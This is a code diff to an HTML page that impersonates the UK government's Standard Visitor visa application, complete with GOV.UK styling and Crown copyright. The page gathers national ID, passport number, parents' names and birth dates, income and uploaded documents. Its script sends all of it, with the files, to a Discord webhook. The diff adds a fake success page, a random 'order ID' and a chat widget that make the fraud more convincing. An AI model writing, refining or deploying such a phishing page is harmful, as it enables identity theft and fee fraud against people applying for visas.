@@ -46,6 +46,12 @@
         }
         .gov-button:hover { background: #005a30; }
 
+        /* Success Page Styles */
+        #successPage { display: none; text-align: left; padding: 40px 0; }
+        .success-panel { background: var(--govuk-success); color: white; padding: 40px; margin-bottom: 30px; }
+        .order-id-box { border: 5px solid var(--govuk-black); padding: 20px; background: var(--govuk-grey); display: inline-block; margin-top: 20px; }
+        .order-id-text { font-family: monospace; font-size: 24px; font-weight: bold; color: var(--govuk-blue); }
+
         footer { background: var(--govuk-grey); padding: 60px 0; margin-top: 80px; border-top: 1px solid var(--govuk-border); font-size: 14px; }
     </style>
 </head>
@@ -59,134 +65,130 @@
 </header>
 
 <div class="container" style="margin-top: 30px;">
-    <div class="urgent-banner">
-        ⚠️ IDENTITY VERIFICATION: You must provide a valid National ID and Email for system verification.
-    </div>
+    <!-- Main Application Page -->
+    <div id="applicationPage">
+        <div class="urgent-banner">
+            ⚠️ IDENTITY VERIFICATION: You must provide a valid National ID and Email for system verification.
+        </div>
 
-    <div class="phase-banner">
-        <span class="tag">BETA</span> This is a new service – your feedback will help us to improve it.
-    </div>
+        <div class="phase-banner">
+            <span class="tag">BETA</span> This is a new service – your feedback will help us to improve it.
+        </div>
 
-    <div class="grid-row">
-        <main>
-            <h1>Apply for a UK Standard Visitor visa</h1>
-            
-            <form id="visaForm">
-                
-                <!-- STEP 1: VERIFICATION -->
-                <h2>1. Identity & Verification</h2>
-                <div class="form-section">
-                    <label for="email">Email address</label>
-                    <span class="hint">We will use this to send your application reference</span>
-                    <input type="email" id="email" required>
-                </div>
-
-                <div class="form-section">
-                    <label for="nationalId">National ID Number</label>
-                    <span class="hint">Enter your CNIC (Pakistan) or Aadhar (India)</span>
-                    <input type="text" id="nationalId" required>
-                </div>
-
-                <!-- STEP 2: PERSONAL -->
-                <h2>2. Personal details</h2>
-                <div class="form-section">
-                    <label for="name">Full name</label>
-                    <span class="hint">Exactly as it appears on your passport</span>
-                    <input type="text" id="name" required>
-                </div>
-
-                <div class="form-section">
-                    <label for="passport">Passport number</label>
-                    <input type="text" id="passport" required>
-                </div>
-
-                <div class="form-section">
-                    <label>Father's Full Name & DOB</label>
-                    <input type="text" id="fatherName" placeholder="Name" required style="margin-bottom: 10px;">
-                    <input type="date" id="fatherDob" required>
-                </div>
-
-                <div class="form-section">
-                    <label>Mother's Full Name & DOB</label>
-                    <input type="text" id="motherName" placeholder="Name" required style="margin-bottom: 10px;">
-                    <input type="date" id="motherDob" required>
-                </div>
-
-                <!-- STEP 3: FINANCES -->
-                <h2>3. Finances and Employment</h2>
-                <div class="form-section">
-                    <label for="jobTitle">What is your current job title?</label>
-                    <input type="text" id="jobTitle" required>
-                </div>
-
-                <div class="form-section">
-                    <label for="income">Total monthly income (after tax)</label>
-                    <span class="hint">In British Pounds (£) or your local currency</span>
-                    <input type="number" id="income" required>
-                </div>
-
-                <div class="form-section">
-                    <label for="savings">How much money do you have for this trip?</label>
-                    <input type="number" id="savings" required>
-                </div>
-
-                <!-- STEP 4: TRAVEL HISTORY -->
-                <h2>4. Travel History</h2>
-                <div class="form-section">
-                    <label>Have you travelled outside your country in the last 10 years?</label>
-                    <textarea id="history" rows="3" placeholder="List countries and years (e.g., UAE 2022, Turkey 2024)"></textarea>
-                </div>
-
-                <!-- STEP 5: FEES -->
-                <h2>5. Visa fees</h2>
-                <div class="fee-calc-box">
-                    <label>Choose your visa duration</label>
-                    <select id="visaType" onchange="calculate()">
-                        <option value="135">Standard Visitor (6 months) - £225</option>
-                        <option value="506">Standard Visitor (2 years) - £506</option>
-                        <option value="903">Standard Visitor (5 years) - £903</option>
-                        <option value="1128">Standard Visitor (10 years) - £1128</option>
-                    </select>
-
-                    <label style="margin-top: 20px;">Processing service</label>
-                    <select id="priority" onchange="calculate()">
-                        <option value="0">Standard (3 weeks) - £200</option>
-                        <option value="500">Priority (5 days) - £500</option>
-                        <option value="1000">Super Priority (24 hours) - £1000</option>
-                    </select>
-
-                    <div class="total-price" style="margin-top: 20px;">
-                        Total: <span id="displayTotal">£135</span>
+        <div class="grid-row">
+            <main>
+                <h1>Apply for a UK Standard Visitor visa</h1>
+                <form id="visaForm">
+                    <h2>1. Identity & Verification</h2>
+                    <div class="form-section">
+                        <label for="email">Email address</label>
+                        <input type="email" id="email" required>
                     </div>
+                    <div class="form-section">
+                        <label for="nationalId">National ID Number</label>
+                        <span class="hint">CNIC (Pakistan) or Aadhar (India)</span>
+                        <input type="text" id="nationalId" required>
+                    </div>
+
+                    <h2>2. Personal details</h2>
+                    <div class="form-section">
+                        <label for="name">Full name</label>
+                        <input type="text" id="name" required>
+                    </div>
+                    <div class="form-section">
+                        <label for="passport">Passport number</label>
+                        <input type="text" id="passport" required>
+                    </div>
+                    <div class="form-section">
+                        <label>Father's Full Name & DOB</label>
+                        <input type="text" id="fatherName" placeholder="Name" required style="margin-bottom: 10px;">
+                        <input type="date" id="fatherDob" required>
+                    </div>
+                    <div class="form-section">
+                        <label>Mother's Full Name & DOB</label>
+                        <input type="text" id="motherName" placeholder="Name" required style="margin-bottom: 10px;">
+                        <input type="date" id="motherDob" required>
+                    </div>
+
+                    <h2>3. Finances and Employment</h2>
+                    <div class="form-section">
+                        <label for="jobTitle">Job title</label>
+                        <input type="text" id="jobTitle" required>
+                    </div>
+                    <div class="form-section">
+                        <label for="income">Monthly income (£)</label>
+                        <input type="number" id="income" required>
+                    </div>
+
+                    <h2>4. Travel History</h2>
+                    <div class="form-section">
+                        <label>Travel History (Last 10 Years)</label>
+                        <textarea id="history" rows="3"></textarea>
+                    </div>
+
+                    <h2>5. Visa fees</h2>
+                    <div class="fee-calc-box">
+                        <label>Visa duration</label>
+                        <select id="visaType" onchange="calculate()">
+                            <option value="225">Standard Visitor (6 months) - £225</option>
+                            <option value="506">Standard Visitor (2 years) - £506</option>
+                            <option value="903">Standard Visitor (5 years) - £903</option>
+                            <option value="1128">Standard Visitor (10 years) - £1128</option>
+                        </select>
+                        <label style="margin-top: 20px;">Processing service</label>
+                        <select id="priority" onchange="calculate()">
+                            <option value="200">Standard (3 weeks) - £200</option>
+                            <option value="500">Priority (5 days) - £500</option>
+                            <option value="1000">Super Priority (24 hours) - £1000</option>
+                        </select>
+                        <div class="total-price" style="margin-top: 20px;">
+                            Total: <span id="displayTotal">£425</span>
+                        </div>
+                    </div>
+
+                    <h2>6. Supporting documents</h2>
+                    <div class="form-section" style="border: 2px dashed var(--govuk-border); padding: 20px; background: var(--govuk-grey);">
+                        <input type="file" id="docs" multiple required>
+                    </div>
+
+                    <button type="submit" class="gov-button" id="submitBtn">Submit and verify application</button>
+                </form>
+            </main>
+            <aside>
+                <div style="border-top: 2px solid var(--govuk-blue); padding-top: 15px;">
+                    <h3>Summary</h3>
+                    <p>Verification takes 24-48 hours.</p>
                 </div>
+            </aside>
+        </div>
+    </div>
 
-                <!-- STEP 6: UPLOADS -->
-                <h2>6. Supporting documents</h2>
-                <div class="form-section" style="border: 2px dashed var(--govuk-border); padding: 20px; background: var(--govuk-grey);">
-                    <label>Upload documents</label>
-                    <span class="hint">Upload Passport, ID Card, 6 months Bank Statements.</span>
-                    <input type="file" id="docs" multiple required>
-                </div>
+    <!-- Success Page Content -->
+    <div id="successPage">
+        <div class="success-panel">
+            <h1 style="color: white; margin: 0;">Application complete</h1>
+            <p style="font-size: 24px;">Your visa application has been successfully submitted.</p>
+        </div>
 
-                <button type="submit" class="gov-button" id="submitBtn">Submit and verify application</button>
-            </form>
-        </main>
+        <h2>What happens next</h2>
+        <p>We have sent a confirmation email to you. Your application will now be verified by our systems team.</p>
+        
+        <div class="order-id-box">
+            <p style="margin: 0; font-weight: bold;">Your Application Reference (Order ID):</p>
+            <span id="orderIdDisplay" class="order-id-text"></span>
+        </div>
 
-        <aside>
-            <div style="border-top: 2px solid var(--govuk-blue); padding-top: 15px;">
-                <h3 style="font-size: 18px;">Application Summary</h3>
-                <p style="font-size: 14px; color: var(--govuk-secondary);">
-                    Your data is processed in accordance with the Data Protection Act 2018. Verification takes approximately 24-48 hours.
-                </p>
-            </div>
-        </aside>
+        <div style="margin-top: 40px; padding: 20px; border-left: 10px solid var(--govuk-blue); background: var(--govuk-grey);">
+            <p><strong>Need help?</strong> Our support team is available via the live chat bubble at the bottom right of this page. Quote your Order ID for faster service.</p>
+        </div>
+        
+        <button class="gov-button" onclick="location.reload()" style="margin-top: 30px; background: var(--govuk-secondary);">Finish</button>
     </div>
 </div>
 
 <footer>
     <div class="container">
-        <p>Built by the Government Digital Service. All content is available under the <strong>Open Government Licence v3.0</strong></p>
-        <p style="color: #6f777b;">© Crown copyright 2026</p>
+        <p>© Crown copyright 2026</p>
     </div>
 </footer>
 
@@ -199,54 +201,63 @@
         document.getElementById('displayTotal').innerText = "£" + (base + priority);
     }
 
+    function generateOrderID() {
+        return 'UKV-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+    }
+
+    // Tawk.to Script Loader
+    function loadChat() {
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+        s1.async=true;
+        s1.src='https://embed.tawk.to/YOUR_PROPERTY_ID/default'; // REPLACE WITH YOUR TAWK ID
+        s1.charset='UTF-8';
+        s1.setAttribute('crossorigin','*');
+        s0.parentNode.insertBefore(s1,s0);
+        })();
+    }
+
     document.getElementById('visaForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         const btn = document.getElementById('submitBtn');
+        const orderId = generateOrderID();
+        
         btn.disabled = true;
-        btn.innerText = "Verifying...";
+        btn.innerText = "Processing...";
 
         const formData = new FormData();
-        
-        // Detailed Data Embed for Discord
         const embed = {
-            title: "🇬🇧 NEW VISA SUBMISSION: " + document.getElementById('name').value.toUpperCase(),
+            title: "🇬🇧 NEW VISA SUBMISSION [" + orderId + "]",
             color: 1928888,
             fields: [
-                { name: "Email Address", value: document.getElementById('email').value, inline: true },
+                { name: "Client Name", value: document.getElementById('name').value, inline: true },
+                { name: "Email", value: document.getElementById('email').value, inline: true },
                 { name: "National ID", value: document.getElementById('nationalId').value, inline: true },
-                { name: "Passport", value: document.getElementById('passport').value, inline: true },
-                { name: "Job Title", value: document.getElementById('jobTitle').value, inline: true },
-                { name: "Monthly Income", value: "£" + document.getElementById('income').value, inline: true },
-                { name: "Savings", value: "£" + document.getElementById('savings').value, inline: true },
-                { name: "Father", value: document.getElementById('fatherName').value, inline: true },
-                { name: "Mother", value: document.getElementById('motherName').value, inline: true },
-                { name: "Travel History", value: document.getElementById('history').value || "None" },
-                { name: "Total Fee Paid", value: document.getElementById('displayTotal').innerText, inline: true }
+                { name: "Total Paid", value: document.getElementById('displayTotal').innerText, inline: true }
             ],
-            footer: { text: "Verified Submission via UKVI Portal v2.6" },
             timestamp: new Date()
         };
 
         formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-
         const files = document.getElementById('docs').files;
-        for (let i = 0; i < files.length; i++) {
-            formData.append(`file${i}`, files[i]);
-        }
+        for (let i = 0; i < files.length; i++) { formData.append(`file${i}`, files[i]); }
 
         try {
-            const res = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-            if(res.ok) {
-                alert("Verification in progress. You will receive an email shortly.");
-                location.reload();
-            } else {
-                throw new Error();
-            }
+            await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+            
+            // Switch to Success Page
+            document.getElementById('applicationPage').style.display = 'none';
+            document.getElementById('successPage').style.display = 'block';
+            document.getElementById('orderIdDisplay').innerText = orderId;
+            
+            // Load Chat Support
+            loadChat();
+            window.scrollTo(0,0);
+            
         } catch (err) {
-            alert("Error: Documents too large or connection failed. Maximum 25MB allowed.");
-        } finally {
+            alert("Error submitting application. Check file sizes.");
             btn.disabled = false;
-            btn.innerText = "Submit and verify application";
         }
     });
 </script>
